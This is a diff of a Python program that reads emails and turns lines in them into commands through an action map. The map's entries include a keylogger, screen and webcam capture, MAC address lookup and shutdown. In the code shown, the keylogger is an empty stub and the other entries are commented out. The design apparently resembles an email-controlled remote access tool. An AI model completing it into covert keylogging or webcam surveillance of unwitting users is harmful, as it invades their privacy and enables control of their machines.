@@ -114,26 +114,34 @@ def receive_mail(imap, smtp):
         # Sleep for 10 second before checking for new emails again
         time.sleep(10)
 
+# Separate each line into main part and sub part
+def parse_msg(msg):
+    options = []
+    for line in msg.split('\n'):
+        options.append(line.split(' - ', 1))
+    
+    return options
+
+#dictionary action map
+def action1():
+    pass
+action_map = {
+    "Key logger": action1,
+    # "Capture Screen": cs.capture_screen,
+    # "Capture Webcam": cw.capture_webcam_image,
+    # "MAC address": mac.mac_address,
+    # "Directory tree": action1,
+    # "Shutdown/Logout": sl.shutdown_logout,
+    #"Application/Process": ap.application_process 
+}
 
 def function(msg):
-    if "SCREEN" in msg:
-        cs.capture_screen()
-    elif "WEBCAM" in msg:
-        cw.capture_webcam_image()
-    elif "MAC" in msg:
-        mac.mac_address()
-    elif "APP_PRO" in msg:
-        ap.app_process()
-
-    # # capture the screen
-    # server.capture_screen()
-
-    # # get the mac address
-    # mac_address = server.get_mac_address()
-    # print(mac_address)
-
-    # capture an image by the camera
-    # server.capture_webcam_image()
+    options = parse_msg(msg)
+    for func in options:
+        if (len(func) == 1):
+            action_map[func[0]]()
+        else: 
+            action_map[func[0]](func[1])
 
 
 if __name__ == "__main__":
